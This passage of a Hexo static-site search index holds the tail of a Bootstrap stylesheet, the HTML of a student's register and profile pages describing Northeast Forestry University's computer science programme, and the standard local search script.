.pt-xl-0,  .py-xl-0 {    padding-top: 0 !important;  }  .pr-xl-0,  .px-xl-0 {    padding-right: 0 !important;  }  .pb-xl-0,  .py-xl-0 {    padding-bottom: 0 !important;  }  .pl-xl-0,  .px-xl-0 {    padding-left: 0 !important;  }  .p-xl-1 {    padding: 0.25rem !important;  }  .pt-xl-1,  .py-xl-1 {    padding-top: 0.25rem !important;  }  .pr-xl-1,  .px-xl-1 {    padding-right: 0.25rem !important;  }  .pb-xl-1,  .py-xl-1 {    padding-bottom: 0.25rem !important;  }  .pl-xl-1,  .px-xl-1 {    padding-left: 0.25rem !important;  }  .p-xl-2 {    padding: 0.5rem !important;  }  .pt-xl-2,  .py-xl-2 {    padding-top: 0.5rem !important;  }  .pr-xl-2,  .px-xl-2 {    padding-right: 0.5rem !important;  }  .pb-xl-2,  .py-xl-2 {    padding-bottom: 0.5rem !important;  }  .pl-xl-2,  .px-xl-2 {    padding-left: 0.5rem !important;  }  .p-xl-3 {    padding: 1rem !important;  }  .pt-xl-3,  .py-xl-3 {    padding-top: 1rem !important;  }  .pr-xl-3,  .px-xl-3 {    padding-right: 1rem !important;  }  .pb-xl-3,  .py-xl-3 {    padding-bottom: 1rem !important;  }  .pl-xl-3,  .px-xl-3 {    padding-left: 1rem !important;  }  .p-xl-4 {    padding: 1.5rem !important;  }  .pt-xl-4,  .py-xl-4 {    padding-top: 1.5rem !important;  }  .pr-xl-4,  .px-xl-4 {    padding-right: 1.5rem !important;  }  .pb-xl-4,  .py-xl-4 {    padding-bottom: 1.5rem !important;  }  .pl-xl-4,  .px-xl-4 {    padding-left: 1.5rem !important;  }  .p-xl-5 {    padding: 3rem !important;  }  .pt-xl-5,  .py-xl-5 {    padding-top: 3rem !important;  }  .pr-xl-5,  .px-xl-5 {    padding-right: 3rem !important;  }  .pb-xl-5,  .py-xl-5 {    padding-bottom: 3rem !important;  }  .pl-xl-5,  .px-xl-5 {    padding-left: 3rem !important;  }  .m-xl-n1 {    margin: -0.25rem !important;  }  .mt-xl-n1,  .my-xl-n1 {    margin-top: -0.25rem !important;  }  .mr-xl-n1,  .mx-xl-n1 {    margin-right: -0.25rem !important;  }  .mb-xl-n1,  .my-xl-n1 {    margin-bottom: -0.25rem !important;  }  .ml-xl-n1,  .mx-xl-n1 {    margin-left: -0.25rem !important;  }  .m-xl-n2 {    margin: -0.5rem !important;  }  .mt-xl-n2,  .my-xl-n2 {    margin-top: -0.5rem !important;  }  .mr-xl-n2,  .mx-xl-n2 {    margin-right: -0.5rem !important;  }  .mb-xl-n2,  .my-xl-n2 {    margin-bottom: -0.5rem !important;  }  .ml-xl-n2,  .mx-xl-n2 {    margin-left: -0.5rem !important;  }  .m-xl-n3 {    margin: -1rem !important;  }  .mt-xl-n3,  .my-xl-n3 {    margin-top: -1rem !important;  }  .mr-xl-n3,  .mx-xl-n3 {    margin-right: -1rem !important;  }  .mb-xl-n3,  .my-xl-n3 {    margin-bottom: -1rem !important;  }  .ml-xl-n3,  .mx-xl-n3 {    margin-left: -1rem !important;  }  .m-xl-n4 {    margin: -1.5rem !important;  }  .mt-xl-n4,  .my-xl-n4 {    margin-top: -1.5rem !important;  }  .mr-xl-n4,  .mx-xl-n4 {    margin-right: -1.5rem !important;  }  .mb-xl-n4,  .my-xl-n4 {    margin-bottom: -1.5rem !important;  }  .ml-xl-n4,  .mx-xl-n4 {    margin-left: -1.5rem !important;  }  .m-xl-n5 {    margin: -3rem !important;  }  .mt-xl-n5,  .my-xl-n5 {    margin-top: -3rem !important;  }  .mr-xl-n5,  .mx-xl-n5 {    margin-right: -3rem !important;  }  .mb-xl-n5,  .my-xl-n5 {    margin-bottom: -3rem !important;  }  .ml-xl-n5,  .mx-xl-n5 {    margin-left: -3rem !important;  }  .m-xl-auto {    margin: auto !important;  }  .mt-xl-auto,  .my-xl-auto {    margin-top: auto !important;  }  .mr-xl-auto,  .mx-xl-auto {    margin-right: auto !important;  }  .mb-xl-auto,  .my-xl-auto {    margin-bottom: auto !important;  }  .ml-xl-auto,  .mx-xl-auto {    margin-left: auto !important;  }}.text-monospace {  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace !important;}.text-justify {  text-align: justify !important;}.text-wrap {  white-space: normal !important;}.text-nowrap {  white-space: nowrap !important;}.text-truncate {  overflow: hidden;  text-overflow: ellipsis;  white-space: nowrap;}.text-left {  text-align: left !important;}.text-right {  text-align: right !important;}.text-center {  text-align: center !important;}@media (min-width: 576px) {  .text-sm-left {    text-align: left !important;  }  .text-sm-right {    text-align: right !important;  }  .text-sm-center {    text-align: center !important;  }}@media (min-width: 768px) {  .text-md-left {    text-align: left !important;  }  .text-md-right {    text-align: right !important;  }  .text-md-center {    text-align: center !important;  }}@media (min-width: 992px) {  .text-lg-left {    text-align: left !important;  }  .text-lg-right {    text-align: right !important;  }  .text-lg-center {    text-align: center !important;  }}@media (min-width: 1200px) {  .text-xl-left {    text-align: left !important;  }  .text-xl-right {    text-align: right !important;  }  .text-xl-center {    text-align: center !important;  }}.text-lowercase {  text-transform: lowercase !important;}.text-uppercase {  text-transform: uppercase !important;}.text-capitalize {  text-transform: capitalize !important;}.font-weight-light {  font-weight: 300 !important;}.font-weight-lighter {  font-weight: lighter !important;}.font-weight-normal {  font-weight: 400 !important;}.font-weight-bold {  font-weight: 700 !important;}.font-weight-bolder {  font-weight: bolder !important;}.font-italic {  font-style: italic !important;}.text-white {  color: #fff !important;}.text-primary {  color: #007bff !important;}a.text-primary:hover, a.text-primary:focus {  color: #0056b3 !important;}.text-secondary {  color: #6c757d !important;}a.text-secondary:hover, a.text-secondary:focus {  color: #494f54 !important;}.text-success {  color: #28a745 !important;}a.text-success:hover, a.text-success:focus {  color: #19692c !important;}.text-info {  color: #17a2b8 !important;}a.text-info:hover, a.text-info:focus {  color: #0f6674 !important;}.text-warning {  color: #ffc107 !important;}a.text-warning:hover, a.text-warning:focus {  color: #ba8b00 !important;}.text-danger {  color: #dc3545 !important;}a.text-danger:hover, a.text-danger:focus {  color: #a71d2a !important;}.text-light {  color: #f8f9fa !important;}a.text-light:hover, a.text-light:focus {  color: #cbd3da !important;}.text-dark {  color: #343a40 !important;}a.text-dark:hover, a.text-dark:focus {  color: #121416 !important;}.text-body {  color: #212529 !important;}.text-muted {  color: #6c757d !important;}.text-black-50 {  color: rgba(0, 0, 0, 0.5) !important;}.text-white-50 {  color: rgba(255, 255, 255, 0.5) !important;}.text-hide {  font: 0/0 a;  color: transparent;  text-shadow: none;  background-color: transparent;  border: 0;}.text-decoration-none {  text-decoration: none !important;}.text-break {  word-break: break-word !important;  overflow-wrap: break-word !important;}.text-reset {  color: inherit !important;}.visible {  visibility: visible !important;}.invisible {  visibility: hidden !important;}@media print {  *,  *::before,  *::after {    text-shadow: none !important;    box-shadow: none !important;  }  a:not(.btn) {    text-decoration: underline;  }  abbr[title]::after {    content: " (" attr(title) ")";  }  pre {    white-space: pre-wrap !important;  }  pre,  blockquote {    border: 1px solid #adb5bd;    page-break-inside: avoid;  }  thead {    display: table-header-group;  }  tr,  img {    page-break-inside: avoid;  }  p,  h2,  h3 {    orphans: 3;    widows: 3;  }  h2,  h3 {    page-break-after: avoid;  }  @page {    size: a3;  }  body {    min-width: 992px !important;  }  .container {    min-width: 992px !important;  }  .navbar {    display: none;  }  .badge {    border: 1px solid #000;  }  .table {    border-collapse: collapse !important;  }  .table td,  .table th {    background-color: #fff !important;  }  .table-bordered th,  .table-bordered td {    border: 1px solid #dee2e6 !important;  }  .table-dark {    color: inherit;  }  .table-dark th,  .table-dark td,  .table-dark thead th,  .table-dark tbody + tbody {    border-color: #dee2e6;  }  .table .thead-dark th {    color: inherit;    border-color: #dee2e6;  }}/*# sourceMappingURL=bootstrap.css.map */]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/register.html"/>
      <url>/sources/register.html</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html><head>  <!-- Basic -->  <meta charset="utf-8" />  <meta http-equiv="X-UA-Compatible" content="IE=edge" />  <!-- Mobile Metas -->  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />  <!-- Site Metas -->  <meta name="keywords" content="" />  <meta name="description" content="" />  <meta name="author" content="" />  <title>Label</title>  <!-- bootstrap core css -->  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />  <!-- fonts style -->  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,600,700&display=swap"    rel="stylesheet" />  <!-- Custom styles for this template -->  <link href="css/style.css" rel="stylesheet" />  <!-- responsive style -->  <link href="css/responsive.css" rel="stylesheet" /></head><body class="sub_page">  <div class="hero_area">    <!-- header section strats -->    <header class="header_section">      <div class="container-fluid">        <nav class="navbar navbar-expand-lg custom_nav-container ">          <a class="navbar-brand" href="index.html">          </a>          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">            <span class="navbar-toggler-icon"></span>          </button>          <div class="collapse navbar-collapse ml-auto" id="navbarSupportedContent">            <ul class="navbar-nav  ml-auto">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>            <form class="form-inline my-2 my-lg-0 ml-0 ml-lg-4 mb-3 mb-lg-0">              <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>            </form>          </div>        </nav>      </div>    </header>    <!-- end header section -->  </div>  <!-- Main login section -->  <section class="about_section layout_padding">    <div class="side_img">    </div>    <div class="container">      <div class="row">        <div class="col-md-6">          <div class="img_container">            <div class="img-box b1">              <img src="images/a-1.jpg" alt="" />            </div>          </div>        </div>        <div class="col-md-6">                      <div class="login_form">              <div class="heading_container">                <form action="Login" method="post">                  用户名: <input type="text" name="user"><br>                  <br>                  密&nbsp;&nbsp;&nbsp;&nbsp;码:                  <input type="password" name="password"><br>                  <br>                  <div class="btn-box">                    <input type="submit" value="注册" name="smit" />                  </div>                </form>              </div>              <div>              </div>            </div>                  </div>  </section>  <!-- end Main login section -->  <!-- info section -->  <section class="info_section layout_padding">    <div class="container">      <div class="row">        <div class="col-md-3">          <div class="info_menu">            <h5>              QUICK LINKS            </h5>            <ul class="navbar-nav  ">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>          </div>        </div>        <div class="col-md-3">          <div class="info_course">            <h5>              NEFU            </h5>            <p>              东北林业大学（Northeast Forestry University），简称东北林大（NEFU）              ，位于黑龙江省哈尔滨市，是一所以林科为优势、林业工程为特色的中华人民共和国教育部直属高校，              由教育部、国家林业局、黑龙江省人民政府三方共建，国家“世界一流学科建设高校”，国家“211工程”、“985工程优势学科创新平台”重点建设高校，              高水平行业特色大学优质资源共享联盟成员高校，“双一流”农科联盟成员高校            </p>          </div>        </div>        <div class="col-md-5 offset-md-1">          <div class="info_news">            <h5>              Computer Science            </h5>            <div class="info_contact">              <!-- <a href="">                Location              </a> -->              <p>                计算机科学与技术（Computer Science and Technology）是国家一级学科，                下设信息安全、软件工程、计算机软件与理论、计算机系统结构、计算机应用技术、计算机技术等专业                主修大数据技术导论、数据采集与处理实践（Python）、Web前/后端开发、统计与数据分析、机器学习、                高级数据库系统、数据可视化、云计算技术、人工智能、自然语言处理、媒体大数据案例分析、网络空间安全、                计算机网络、数据结构、软件工程、操作系统等课程，以及大数据方向系列实验，                并完成程序设计、数据分析、机器学习、数据可视化、大数据综合应用实践、专业实训和毕业设计等多种实践环节。              </p>            </div>          </div>        </div>      </div>    </div>  </section>  <!-- end info section -->  <!-- footer section -->  <footer class="container-fluid footer_section">    <p>lbl~ All rights reserved.</p>  </footer>  <!-- footer section -->  <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>  <script type="text/javascript" src="js/bootstrap.js"></script></body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/login1.html"/>
      <url>/sources/login1.html</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html><head>  <!-- Basic -->  <meta charset="utf-8" />  <meta http-equiv="X-UA-Compatible" content="IE=edge" />  <!-- Mobile Metas -->  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />  <!-- Site Metas -->  <meta name="keywords" content="" />  <meta name="description" content="" />  <meta name="author" content="" />  <title>Label</title>  <!-- bootstrap core css -->  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />  <!-- fonts style -->  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,600,700&display=swap" rel="stylesheet" />  <!-- Custom styles for this template -->  <link href="css/style.css" rel="stylesheet" />  <!-- responsive style -->  <link href="css/responsive.css" rel="stylesheet" /></head><body class="sub_page">  <div class="hero_area">    <!-- header section strats -->    <header class="header_section">      <div class="container-fluid">        <nav class="navbar navbar-expand-lg custom_nav-container ">          <a class="navbar-brand" href="index.html">                     </a>          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">            <span class="navbar-toggler-icon"></span>          </button>          <div class="collapse navbar-collapse ml-auto" id="navbarSupportedContent">            <ul class="navbar-nav  ml-auto">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>            <form class="form-inline my-2 my-lg-0 ml-0 ml-lg-4 mb-3 mb-lg-0">              <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>            </form>          </div>        </nav>      </div>    </header>    <!-- end header section -->  </div><!-- about section --><section class="about_section layout_padding">  <div class="side_img">      </div>  <div class="container">    <div class="row">      <div class="col-md-6">        <div class="img_container">          <div class="img-box b1">            <img src="images/a-1.jpg" alt="" />          </div>          <div class="img-box b2">            <img src="images/a-2.jpg" alt="" />          </div>        </div>      </div>      <div class="col-md-6">        <div class="detail-box">          <div class="heading_container">            <h3>              个人简介            </h3>            <p>              一段简单的个人简介：本人性别男，身高体重不详，重度拖延症患者，喜欢娱乐，喜欢运动，喜欢吃饭睡觉              比较佛系，只有当ddl来临时才会激发他的动力......            </p>            <a href="">              Read More            </a>          </div>        </div>      </div>    </div>  </div></section><!-- end about section -->  <!-- info section -->  <section class="info_section layout_padding">    <div class="container">      <div class="row">        <div class="col-md-3">          <div class="info_menu">            <h5>              QUICK LINKS            </h5>            <ul class="navbar-nav  ">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>          </div>        </div>        <div class="col-md-3">          <div class="info_course">            <h5>              NEFU            </h5>            <p>              东北林业大学（Northeast Forestry University），简称东北林大（NEFU）               ，位于黑龙江省哈尔滨市，是一所以林科为优势、林业工程为特色的中华人民共和国教育部直属高校，              由教育部、国家林业局、黑龙江省人民政府三方共建，国家“世界一流学科建设高校”，国家“211工程”、“985工程优势学科创新平台”重点建设高校，              高水平行业特色大学优质资源共享联盟成员高校，“双一流”农科联盟成员高校             </p>          </div>        </div>        <div class="col-md-5 offset-md-1">          <div class="info_news">            <h5>              Computer Science            </h5>            <div class="info_contact">              <!-- <a href="">                Location              </a> -->              <p>                计算机科学与技术（Computer Science and Technology）是国家一级学科，                下设信息安全、软件工程、计算机软件与理论、计算机系统结构、计算机应用技术、计算机技术等专业                主修大数据技术导论、数据采集与处理实践（Python）、Web前/后端开发、统计与数据分析、机器学习、                高级数据库系统、数据可视化、云计算技术、人工智能、自然语言处理、媒体大数据案例分析、网络空间安全、                计算机网络、数据结构、软件工程、操作系统等课程，以及大数据方向系列实验，                并完成程序设计、数据分析、机器学习、数据可视化、大数据综合应用实践、专业实训和毕业设计等多种实践环节。              </p>            </div>                      </div>        </div>      </div>    </div>  </section>  <!-- end info section -->  <!-- footer section -->  <footer class="container-fluid footer_section">    <p>lbl~ All rights reserved.</p>  </footer>  <!-- footer section -->  <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>  <script type="text/javascript" src="js/bootstrap.js"></script></body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>1</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/search.js"/>
      <url>/search.js</url>
      
        <content type="html"><![CDATA[// A local search script with the help of [hexo-generator-search](https://github.com/PaicHyperionDev/hexo-generator-search)// Copyright (C) 2015 // Joseph Pan <http://github.com/wzpan>// Shuhao Mao <http://github.com/maoshuhao>// Edited by MOxFIVE <http://github.com/MOxFIVE>var searchFunc = function(path, search_id, content_id) {    'use strict';    $.ajax({    url: path,    dataType: "xml",    success: function( xmlResponse ) {    // get the contents from search data    var datas = $( "entry", xmlResponse ).map(function() {    return {    title: $( "title", this ).text(),    content: $("content",this).text(),    url: $( "url" , this).text()    };    }).get();    var $input = document.getElementById(search_id);    var $resultContent = document.getElementById(content_id);    $input.addEventListener('input', function(){    var str='<ul class=\"search-result-list\">';     var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);    $resultContent.innerHTML = "";    if (this.value.trim().length <= 0) {    return;    }    // perform local searching    datas.forEach(function(data) {    var isMatch = true;    var content_index = [];    var data_title = data.title.trim().toLowerCase();    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();    var data_url = data.url;    var index_title = -1;    var index_content = -1;    var first_occur = -1;    // only match artiles with not empty titles and contents    if(data_title != '' && data_content != '') {    keywords.forEach(function(keyword, i) {    index_title = data_title.indexOf(keyword);    index_content = data_content.indexOf(keyword);    if( index_title < 0 && index_content < 0 ){    isMatch = false;    } else {    if (index_content < 0) {    index_content = 0;    }    if (i == 0) {    first_occur = index_content;    }    }    });    }    // show search results    if (isMatch) {    str += "<li><a href='"+ data_url +"' class='search-result-title' target='_blank'>"+ "> " + data_title +"</a>";    var content = data.content.trim().replace(/<[^>]+>/g,"");    if (first_occur >= 0) {    // cut out characters    var start = first_occur - 6;    var end = first_occur + 6;    if(start < 0){    start = 0;    }    if(start == 0){    end = 10;    }    if(end > content.length){    end = content.length;    }    var match_content = content.substr(start, end);     // highlight all keywords    keywords.forEach(function(keyword){    var regS = new RegExp(keyword, "gi");    match_content = match_content.replace(regS, "<em class=\"search-keyword\">"+keyword+"</em>");    })    str += "<p class=\"search-result\">" + match_content +"...</p>"    }    }    })    $resultContent.innerHTML = str;    })    }    })    }var path = "/search.xml";searchFunc(path,'local-search-input','local-search-result');var inputArea = document.querySelector("#local-search-input");var getSearchFile = function(){var path = "/search.xml";searchFunc(path, 'local-search-input', 'local-search-result');}inputArea.onfocus = function(){ getSearchFile() }inputArea.onkeydown = function(){ if(event.keyCode==13) return false}$resultArea.bind("DOMNodeRemoved DOMNodeInserted", function(e) {    if (!$(e.target).text()) {        $(".no-result").show(200);     } else {      $(".no-result").hide();    }})]]></content>
      
    </entry>
    
    
  
</search>
